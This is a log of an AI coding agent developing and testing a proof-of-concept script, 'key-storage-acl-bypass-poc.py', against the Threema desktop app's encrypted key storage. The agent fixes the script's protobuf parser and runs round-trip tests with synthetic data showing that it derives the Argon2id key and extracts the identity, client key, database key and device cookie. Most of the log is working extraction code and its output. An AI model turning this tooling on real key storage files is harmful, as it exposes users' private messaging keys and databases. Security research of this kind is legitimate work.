+print(f'Memory: {kdf_fields[3][0]} (expected {memory_bytes})')
+print(f'Iterations: {kdf_fields[4][0]} (expected {iterations})')
+print(f'Parallelism: {kdf_fields[5][0]} (expected {parallelism})')
+
+# Decrypt
+key2 = argon2_ll.hash_secret_raw(
+    secret=password.encode('utf-8'), salt=kdf_fields[2][0],
+    time_cost=kdf_fields[4][0], memory_cost=kdf_fields[3][0],
+    hash_len=32, parallelism=kdf_fields[5][0],
+    type=argon2_ll.Type.ID, version=0x13)
+box2 = SecretBox(key2)
+recovered = box2.decrypt(ct_parsed, nonce_parsed)
+print(f'Decryption match: {recovered == plaintext}')
+print('Full outer layer round-trip PASSED')
+"
+
+Varint encoding test:
+  encode_varint(0) = 00
+  encode_varint(131072) = 808008
+Key: 32 bytes
+Version: 0 (expected 0)
+Salt len: 16 (expected 16)
+Memory: 131072 (expected 131072)
+Iterations: 3 (expected 3)
+Parallelism: 1 (expected 1)
+Decryption match: True
+Full outer layer round-trip PASSED
+[0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=80, offset=700][0m
+I found a bug in the PoC's protobuf parsing. Let me check the generated protobuf code to verify field numbers:
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=80, offset=1100][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=80, offset=1180][0m
+[0m✱ [0mGrep "OuterKeyStorageV2.*decode|createBaseOuterKeyStorageV2"[90m in /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf · 2 matches[0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/apps/desktop/src/common/internal-protobuf/key-storage-file.ts[90m [limit=80, offset=1280][0m
+[0m→ [0mRead /tmp/opencode/threema-desktop/key-storage-acl-bypass-poc.py
+Now I see the bug in the PoC parsing. Let me fix the `parse_outer_key_storage` function:
+[0m
+[0m← [0mEdit /tmp/opencode/threema-desktop/key-storage-acl-bypass-poc.py
+Index: /tmp/opencode/threema-desktop/key-storage-acl-bypass-poc.py
+===================================================================
+--- /tmp/opencode/threema-desktop/key-storage-acl-bypass-poc.py
++++ /tmp/opencode/threema-desktop/key-storage-acl-bypass-poc.py
+@@ -286,44 +286,41 @@
+ # ============================================================
+ 
+ def parse_outer_key_storage(keystorage_bytes: bytes) -> dict:
+     """Parse the outer key storage protobuf and extract fields.
+-    
++
+     File format: u16-le(OuterKeyStorage_Version.V2_0=1) || OuterKeyStorageV2.encode()
+-    
+-    OuterKeyStorageV2 protobuf:
++
++    OuterKeyStorageV2 protobuf (from key-storage-file.proto):
+       field 1 (bytes): encryptedIntermediate = EncryptedDataWithNonceAhead (nonce||ct)
+-      field 2 (message): kdfParameters.oneof -> argon2id (field 1 of oneof)
++      field 2 (message): kdfParameters oneof -> argon2id = Argon2idParameters (directly, field 2)
+     """
+     print("[*] Step 3: Parsing outer key storage (OuterKeyStorageV2)")
+-    
++
+     # Strip u16-le version prefix
+     version = struct.unpack('<H', keystorage_bytes[:2])[0]
+     if version != 1:  # V2_0 = 1
+         print(f"[!] Warning: Outer key storage version = {version} (expected 1 for V2_0)")
+     payload = keystorage_bytes[2:]
+-    
++
+     decoder = ProtobufDecoder(payload)
+     fields = decoder.parse_fields()
+-    
++
+     # field 1: encryptedIntermediate (bytes)
+     encrypted_intermediate = fields.get(1, [b''])[0]
+-    
+-    # field 2: kdfParameters (oneof), sub-message is argon2id (field 1)
++
++    # field 2: kdfParameters oneof -> argon2id is field 2 directly (not nested wrapper)
++    # In protobuf, a oneof with a single option at field N maps directly to field N
+     kdf_params_data = fields.get(2, [b''])[0]
+-    kdf_decoder = ProtobufDecoder(kdf_params_data)
+-    kdf_fields = kdf_decoder.parse_fields()
+-    
+-    # Argon2idParameters protobuf:
++    argon_decoder = ProtobufDecoder(kdf_params_data)
++    argon_fields = argon_decoder.parse_fields()
++
++    # Argon2idParameters protobuf (from key-storage-file.proto):
+     #   field 1 (int32): version (0 = VERSION_1_3)
+     #   field 2 (bytes): salt
+     #   field 3 (uint32): memoryBytes
+     #   field 4 (uint32): iterations
+     #   field 5 (uint32): parallelism
+-    argon2id_params = kdf_fields.get(1, [b''])[0]  # oneof field 1 = argon2id
+-    argon_decoder = ProtobufDecoder(argon2id_params)
+-    argon_fields = argon_decoder.parse_fields()
+-    
+     kdf_params = {
+         'version': argon_fields.get(1, [0])[0],  # VERSION_1_3 = 0
+         'salt': argon_fields.get(2, [b''])[0],
+         'memory_bytes': argon_fields.get(3, [0])[0],
+
+[0m
+I found a bug in the protobuf parsing - the oneof `argon2id` is field 2 directly in the outer message, not a nested wrapper. Let me fix it:
+Now let me run the full round-trip test with the fixed parser:
+[0m$ [0mcd /tmp/opencode/threema-desktop && python3 -c "
+import struct, secrets, sys, os
+os.environ['PYTHONPATH'] = '/tmp/opencode/threema-desktop'
+sys.path.insert(0, '/tmp/opencode/threema-desktop')
+from key_storage_acl_bypass_poc import (
+    ProtobufDecoder, derive_argon2id_key, decrypt_intermediate_layer,
+    parse_outer_key_storage, parse_intermediate_and_extract_inner,
+    parse_inner_key_storage
+)
+from nacl.secret import SecretBox
+from argon2 import low_level as argon2_ll
+
+# Generate test data
+password = 'my_test_password_123'
+salt = secrets.token_bytes(16)
+memory_bytes = 128 * 1024  # 128 KiB for fast test
+iterations = 3
+parallelism = 1
+argon2_version = 0  # VERSION_1_3
+
+key = argon2_ll.hash_secret_raw(
+    secret=password.encode('utf-8'), salt=salt,
+    time_cost=iterations, memory_cost=memory_bytes,
+    hash_len=32, parallelism=parallelism,
+    type=argon2_ll.Type.ID, version=0x13)
+
+# Build InnerKeyStorageV3
+identity = 'ECHOECHO'
+ck = secrets.token_bytes(32)
+server_group = '*G'
+dgk = secrets.token_bytes(32)
+database_key = secrets.token_bytes(32)
+device_cookie = secrets.token_bytes(16)
+d2m = 123456789
+csp = 987654321
+
+def enc_varint(val):
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F; val >>= 7
+        if val > 0: b |= 0x80
+        encoded.append(b)
+    return bytes(encoded) if len(encoded) > 0 else b'\x00'
+
+def proto_varint(fnum, val):
+    v = enc_varint(val)
+    return bytes([fnum << 3 | 0]) + v
+
+def proto_bytes(fnum, data):
+    return bytes([fnum << 3 | 2]) + bytes([len(data)]) + data
+
+# InnerKeyStorageV3
+id_data = proto_bytes(1, identity.encode()) + proto_bytes(2, ck) + proto_bytes(4, server_group.encode())
+dev_ids = proto_varint(1, d2m) + proto_varint(2, csp)
+inner_payload = (proto_bytes(1, id_data) + proto_bytes(2, dgk) + 
+                 proto_bytes(3, database_key) + proto_bytes(4, dev_ids) + 
+                 proto_bytes(5, device_cookie))
+inner_bytes = struct.pack('<H', 3) + inner_payload
+
+# IntermediateKeyStorageV1_1 (plaintext inner)
+intermediate_payload = proto_bytes(1, inner_bytes)
+intermediate_bytes = struct.pack('<H', 1) + intermediate_payload
+
+# Encrypt intermediate
+box = SecretBox(key)
+nonce = secrets.token_bytes(24)
+ct = box.encrypt(intermediate_bytes, nonce)
+# SecretBox.encrypt returns nonce(24) + ciphertext+MAC
+encrypted_intermediate = ct
+
+# Build Argon2idParameters
+argon_params = (proto_varint(1, argon2_version) + proto_bytes(2, salt) +
+                proto_varint(3, memory_bytes) + proto_varint(4, iterations) +
+                proto_varint(5, parallelism))
+
+# Build OuterKeyStorageV2
+outer_payload = proto_bytes(1, encrypted_intermediate) + proto_bytes(2, argon_params)
+outer_bytes = struct.pack('<H', 1) + outer_payload
+
+# === Run through PoC ===
+outer_data = parse_outer_key_storage(outer_bytes)
+print()
+recovered_key = derive_argon2id_key(password, outer_data['kdf_params'])
+print()
+intermediate = decrypt_intermediate_layer(outer_data['nonce'], outer_data['ciphertext'], recovered_key)
+print()
+inter_result = parse_intermediate_and_extract_inner(intermediate)
+print()
+inner_data = parse_inner_key_storage(inter_result['inner_bytes'])
+print()
+
+# Verify
+assert inner_data['identity'] == identity, f'Identity: {inner_data[\"identity\"]} != {identity}'
+assert inner_data['ck'] == ck, 'ck mismatch'
+assert inner_data['database_key'] == database_key, 'databaseKey mismatch'
+assert inner_data['dgk'] == dgk, 'dgk mismatch'
+assert inner_data['server_group'] == server_group, 'serverGroup mismatch'
+assert inner_data['device_cookie'] == device_cookie, 'deviceCookie mismatch'
+assert inner_data['device_ids']['d2m_device_id'] == d2m, 'd2m mismatch'
+assert inner_data['device_ids']['csp_device_id'] == csp, 'csp mismatch'
+
+print('=== ALL ASSERTIONS PASSED ===')
+" 2>&1
+
+Traceback (most recent call last):
+  File "<string>", line 5, in <module>
+ModuleNotFoundError: No module named 'key_storage_acl_bypass_poc'
+[0m
+[0m$ [0mls -la /tmp/opencode/threema-desktop/key-storage-acl-bypass-poc.py
+-rw-r--r-- 1 runner runner 29765 Aug  9 02:35 /tmp/opencode/threema-desktop/key-storage-acl-bypass-poc.py
+[0m
+[0m$ [0mcd /tmp/opencode/threema-desktop && PYTHONPATH=/tmp/opencode/threema-desktop python3 -c "
+import importlib.util
+spec = importlib.util.spec_from_file_location('poc', '/tmp/opencode/threema-desktop/key-storage-acl-bypass-poc.py')
+poc = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(poc)
+print('Module loaded successfully')
+
+# Now test with mock data
+import struct, secrets
+
+password = 'my_test_password_123'
+salt = secrets.token_bytes(16)
+memory_bytes = 128 * 1024
+iterations = 3
+parallelism = 1
+argon2_version = 0
+
+from argon2 import low_level as argon2_ll
+key = argon2_ll.hash_secret_raw(
+    secret=password.encode('utf-8'), salt=salt,
+    time_cost=iterations, memory_cost=memory_bytes,
+    hash_len=32, parallelism=parallelism,
+    type=argon2_ll.Type.ID, version=0x13)
+
+identity = 'ECHOECHO'
+ck = secrets.token_bytes(32)
+server_group = '*G'
+dgk = secrets.token_bytes(32)
+database_key = secrets.token_bytes(32)
+device_cookie = secrets.token_bytes(16)
+d2m = 123456789
+csp = 987654321
+
+def enc_varint(val):
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F; val >>= 7
+        if val > 0: b |= 0x80
+        encoded.append(b)
+    return bytes(encoded) if len(encoded) > 0 else b'\x00'
+
+def proto_varint(fnum, val):
+    return bytes([fnum << 3 | 0]) + enc_varint(val)
+
+def proto_bytes(fnum, data):
+    return bytes([fnum << 3 | 2]) + bytes([len(data)]) + data
+
+id_data = proto_bytes(1, identity.encode()) + proto_bytes(2, ck) + proto_bytes(4, server_group.encode())
+dev_ids = proto_varint(1, d2m) + proto_varint(2, csp)
+inner_payload = (proto_bytes(1, id_data) + proto_bytes(2, dgk) +
+                 proto_bytes(3, database_key) + proto_bytes(4, dev_ids) +
+                 proto_bytes(5, device_cookie))
+inner_bytes = struct.pack('<H', 3) + inner_payload
+
+intermediate_payload = proto_bytes(1, inner_bytes)
+intermediate_bytes = struct.pack('<H', 1) + intermediate_payload
+
+from nacl.secret import SecretBox
+box = SecretBox(key)
+nonce = secrets.token_bytes(24)
+ct = box.encrypt(intermediate_bytes, nonce)
+
+argon_params = (proto_varint(1, argon2_version) + proto_bytes(2, salt) +
+                proto_varint(3, memory_bytes) + proto_varint(4, iterations) +
+                proto_varint(5, parallelism))
+
+outer_payload = proto_bytes(1, ct) + proto_bytes(2, argon_params)
+outer_bytes = struct.pack('<H', 1) + outer_payload
+
+# Run through PoC
+outer_data = poc.parse_outer_key_storage(outer_bytes)
+print()
+recovered_key = poc.derive_argon2id_key(password, outer_data['kdf_params'])
+print()
+intermediate = poc.decrypt_intermediate_layer(outer_data['nonce'], outer_data['ciphertext'], recovered_key)
+print()
+inter_result = poc.parse_intermediate_and_extract_inner(intermediate)
+print()
+inner_data = poc.parse_inner_key_storage(inter_result['inner_bytes'])
+print()
+
+assert inner_data['identity'] == identity, f'Identity mismatch: {inner_data[\"identity\"]} != {identity}'
+assert inner_data['ck'] == ck, 'ck mismatch'
+assert inner_data['database_key'] == database_key, 'databaseKey mismatch'
+assert inner_data['dgk'] == dgk, 'dgk mismatch'
+assert inner_data['server_group'] == server_group, 'serverGroup mismatch'
+assert inner_data['device_cookie'] == device_cookie, 'deviceCookie mismatch'
+assert inner_data['device_ids']['d2m_device_id'] == d2m, 'd2m mismatch'
+assert inner_data['device_ids']['csp_device_id'] == csp, 'csp mismatch'
+
+print()
+print('=== ALL ASSERTIONS PASSED ===')
+" 2>&1
+
+Traceback (most recent call last):
+  File "<string>", line 73, in <module>
+  File "/tmp/opencode/threema-desktop/key-storage-acl-bypass-poc.py", line 371, in derive_argon2id_key
+    key = argon2_ll.hash_secret_raw(
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/argon2/low_level.py", line 158, in hash_secret_raw
+    raise HashingError(error_to_str(rv))
+argon2.exceptions.HashingError: Salt is too short
+Module loaded successfully
+[*] Step 3: Parsing outer key storage (OuterKeyStorageV2)
+  encrypted_intermediate length: 224 bytes
+  nonce: 3f782969ab56ef4dd4479b1d45689044e0ac43546a68eb2b
+  ciphertext+MAC length: 200 bytes
+  KDF: argon2id, version=0, memory=0 bytes, iterations=0, parallelism=0
+  salt: 
+
+[*] Step 4: Deriving Argon2id key from password
+[0m
+[0m$ [0mcd /tmp/opencode/threema-desktop && python3 -c "
+import struct
+
+def enc_varint(val):
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F; val >>= 7
+        if val > 0: b |= 0x80
+        encoded.append(b)
+    return bytes(encoded) if len(encoded) > 0 else b'\x00'
+
+def proto_varint(fnum, val):
+    return bytes([fnum << 3 | 0]) + enc_varint(val)
+
+def proto_bytes(fnum, data):
+    return bytes([fnum << 3 | 2]) + bytes([len(data)]) + data
+
+# Test with actual values
+salt = b'0123456789abcdef'  # 16 bytes
+memory_bytes = 128 * 1024  # 131072
+iterations = 3
+parallelism = 1
+version = 0
+
+argon_params = (proto_varint(1, version) + proto_bytes(2, salt) +
+                proto_varint(3, memory_bytes) + proto_varint(4, iterations) +
+                proto_varint(5, parallelism))
+
+print(f'argon_params hex: {argon_params.hex()}')
+print(f'argon_params length: {len(argon_params)}')
+
+# Now parse with ProtobufDecoder
+class ProtobufDecoder:
+    def __init__(self, data): self.data = data; self.pos = 0
+    def _read_varint(self):
+        result = 0; shift = 0
+        while self.pos < len(self.data):
+            byte = self.data[self.pos]; self.pos += 1
+            result |= (byte & 0x7F) << shift
+            if (byte & 0x80) == 0: break
+            shift += 7
+        return result
+    def _read_bytes(self):
+        length = self._read_varint()
+        result = self.data[self.pos:self.pos + length]; self.pos += length
+        return result
+    def _read_tag(self):
+        if self.pos >= len(self.data): return None, None
+        tag = self._read_varint()
+        return tag >> 3, tag & 0x7
+    def parse_fields(self):
+        fields = {}
+        while True:
+            fn, wt = self._read_tag()
+            if fn is None: break
+            if wt == 0: fields.setdefault(fn, []).append(self._read_varint())
+            elif wt == 2: fields.setdefault(fn, []).append(self._read_bytes())
+            else: break
+        return fields
+
+d = ProtobufDecoder(argon_params)
+fields = d.parse_fields()
+print(f'Parsed fields: {dict(fields)}')
+for fn, vals in fields.items():
+    print(f'  field {fn}: {[v.hex() if isinstance(v, bytes) else v for v in vals]}')
+"
+
+argon_params hex: 08001210303132333435363738396162636465661880800820032801
+argon_params length: 28
+Parsed fields: {1: [0], 2: [b'0123456789abcdef'], 3: [131072], 4: [3], 5: [1]}
+  field 1: [0]
+  field 2: ['30313233343536373839616263646566']
+  field 3: [131072]
+  field 4: [3]
+  field 5: [1]
+[0m
+[0m$ [0mcd /tmp/opencode/threema-desktop && python3 -c "
+import struct, secrets, importlib.util
+spec = importlib.util.spec_from_file_location('poc', 'key-storage-acl-bypass-poc.py')
+poc = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(poc)
+
+# Create the argon params and outer proto manually
+def enc_varint(val):
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F; val >>= 7
+        if val > 0: b |= 0x80
+        encoded.append(b)
+    return bytes(encoded) if len(encoded) > 0 else b'\x00'
+
+def proto_varint(fnum, val):
+    return bytes([fnum << 3 | 0]) + enc_varint(val)
+
+def proto_bytes(fnum, data):
+    return bytes([fnum << 3 | 2]) + bytes([len(data)]) + data
+
+salt = b'0123456789abcdef'
+memory_bytes = 128 * 1024
+iterations = 3
+parallelism = 1
+version = 0
+
+argon_params = (proto_varint(1, version) + proto_bytes(2, salt) +
+                proto_varint(3, memory_bytes) + proto_varint(4, iterations) +
+                proto_varint(5, parallelism))
+print(f'argon_params hex: {argon_params.hex()}')
+
+# Build outer proto
+ct = secrets.token_bytes(100)  # mock ciphertext
+outer_payload = proto_bytes(1, ct) + proto_bytes(2, argon_params)
+outer_bytes = struct.pack('<H', 1) + outer_payload
+
+# Parse manually
+d = poc.ProtobufDecoder(outer_bytes[2:])
+fields = d.parse_fields()
+print(f'Outer fields keys: {list(fields.keys())}')
+if 2 in fields:
+    kdf_data = fields[2][0]
+    print(f'KDF field 2 data hex: {kdf_data.hex()}')
+    print(f'KDF field 2 matches argon_params: {kdf_data == argon_params}')
+    
+    # Parse kdf data
+    ad = poc.ProtobufDecoder(kdf_data)
+    kdf_fields = ad.parse_fields()
+    print(f'KDF sub-fields: {dict(kdf_fields)}')
+"
+
+argon_params hex: 08001210303132333435363738396162636465661880800820032801
+Outer fields keys: [1, 2]
+KDF field 2 data hex: 08001210303132333435363738396162636465661880800820032801
+KDF field 2 matches argon_params: True
+KDF sub-fields: {1: [0], 2: [b'0123456789abcdef'], 3: [131072], 4: [3], 5: [1]}
+[0m
+[93m[1m! [0mpermission requested: external_directory (/tmp/*); auto-rejecting
+[0m✗ [0mcd /tmp/opencodecode && python3 << 'PYEOF'
+import struct, secrets, importlib.util, os
+
+spec = importlib.util.spec_from_file_location('poc', '/tmp/opencode/threema-desktop/key-storage-acl-bypass-poc.py')
+poc = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(poc)
+
+from argon2 import low_level as argon2_ll
+from nacl.secret import SecretBox
+
+password = 'my_test_password_123'
+salt = secrets.token_bytes(16)
+memory_bytes = 128 * 1024
+iterations = 3
+parallelism = 1
+version = 0
+
+key = argon2_ll.hash_secret_raw(
+    secret=password.encode('utf-8'), salt=salt,
+    time_cost=iterations, memory_cost=memory_bytes,
+    hash_len=32, parallelism=parallelism,
+    type=argon2_ll.Type.ID, version=0x13)
+
+identity = 'ECHOECHO'
+ck = secrets.token_bytes(32)
+server_group = '*G'
+dgk = secrets.token_bytes(32)
+database_key = secrets.token_bytes(32)
+device_cookie = secrets.token_bytes(16)
+d2m = 123456789
+csp = 987654321
+
+def enc_varint(val):
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F; val >>= 7
+        if val > 0: b |= 0x80
+        encoded.append(b)
+    return bytes(encoded) if len(encoded) > 0 else b'\x00'
+
+def proto_varint(fnum, val):
+    return bytes([fnum << 3 | 0]) + enc_varint(val)
+
+def proto_bytes(fnum, data):
+    return bytes([fnum << 3 | 2]) + bytes([len(data)]) + data
+
+# Build InnerKeyStorageV3
+id_data = proto_bytes(1, identity.encode()) + proto_bytes(2, ck) + proto_bytes(4, server_group.encode())
+dev_ids = proto_varint(1, d2m) + proto_varint(2, csp)
+inner_payload = (proto_bytes(1, id_data) + proto_bytes(2, dgk) + 
+                 proto_bytes(3, database_key) + proto_bytes(4, dev_ids) + 
+                 proto_bytes(5, device_cookie))
+inner_bytes = struct.pack('<H', 3) + inner_payload
+
+# Build IntermediateKeyStorageV1_1
+intermediate_payload = proto_bytes(1, inner_bytes)
+intermediate_bytes = struct.pack('<H', 1) + intermediate_payload
+
+# Encrypt
+box = SecretBox(key)
+nonce = secrets.token_bytes(24)
+ct = box.encrypt(intermediate_bytes, nonce)
+# ct = nonce(24) + ciphertext+MAC, this is EncryptedDataWithNonceAhead
+
+# Build Argon2idParameters
+argon_params = (proto_varint(1, version) + proto_bytes(2, salt) +
+                proto_varint(3, memory_bytes) + proto_varint(4, iterations) +
+                proto_varint(5, parallelism))
+
+# Build OuterKeyStorageV2
+outer_payload = proto_bytes(1, ct) + proto_bytes(2, argon_params)
+outer_bytes = struct.pack('<H', 1) + outer_payload
+
+print(f'outer_bytes length: {len(outer_bytes)}')
+print(f'outer_bytes hex (first 40): {outer_bytes[:40].hex()}')
+
+# === Test parse_outer_key_storage ===
+outer_data = poc.parse_outer_key_storage(outer_bytes)
+print()
+
+print(f'kdf_params: {outer_data["kdf_params"]}')
+print()
+
+# Test key derivation
+recovered_key = poc.derive_argon2id_key(password, outer_data['kdf_params'])
+print()
+
+# Test decryption
+intermediate = poc.decrypt_intermediate_layer(outer_data['nonce'], outer_data['ciphertext'], recovered_key)
+print()
+
+inter_result = poc.parse_intermediate_and_extract_inner(intermediate)
+print()
+
+inner_data = poc.parse_inner_key_storage(inter_result['inner_bytes'])
+print()
+
+# Verify
+ok = True
+if inner_data['identity'] != identity: print(f'FAIL: identity {inner_data["identity"]} != {identity}'); ok = False
+if inner_data['ck'] != ck: print('FAIL: ck'); ok = False
+if inner_data['database_key'] != database_key: print('FAIL: databaseKey'); ok = False
+if inner_data['dgk'] != dgk: print('FAIL: dgk'); ok = False
+if inner_data['server_group'] != server_group: print('FAIL: serverGroup'); ok = False
+if inner_data['device_cookie'] != device_cookie: print('FAIL: deviceCookie'); ok = False
+if inner_data['device_ids']['d2m_device_id'] != d2m: print('FAIL: d2m'); ok = False
+if inner_data['device_ids']['csp_device_id'] != csp: print('FAIL: csp'); ok = False
+
+if ok:
+    print('=== ALL ASSERTIONS PASSED ===')
+else:
+    print('=== TESTS FAILED ===')
+PYEOF
+ failed
+[91m[1mError: [0mThe user rejected permission to use this specific tool call.
+The parsing works in isolation. Let me re-run the full test more carefully:
